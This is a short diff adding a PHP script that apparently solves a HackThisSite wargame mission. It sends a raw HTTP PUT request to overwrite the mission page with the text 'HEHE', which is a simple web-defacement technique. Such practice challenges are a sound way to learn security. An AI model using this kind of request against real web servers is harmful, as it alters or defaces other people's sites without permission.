@@ -1,0 +1,15 @@
+<?php
+$host = "www.hackthissite.org";
+$ref = "/missions/realistic/3/";
+$data = "<h1>HEHE</h1>";
+$len = strlen($data);
+$fp = fsockopen($host,80);
+fwrite($fp, "PUT ".$ref." HTTP/1.1\r\n");
+fwrite($fp, "Host:".$host."\r\n");
+fwrite($fp, "Content-Length:$len\r\n\r\n");
+fwrite($fp, $data."\r\n\r\n");
+while (!feof($fp)) {
+	echo fgets($fp, 128);
+}
+fclose($fp);
+?>
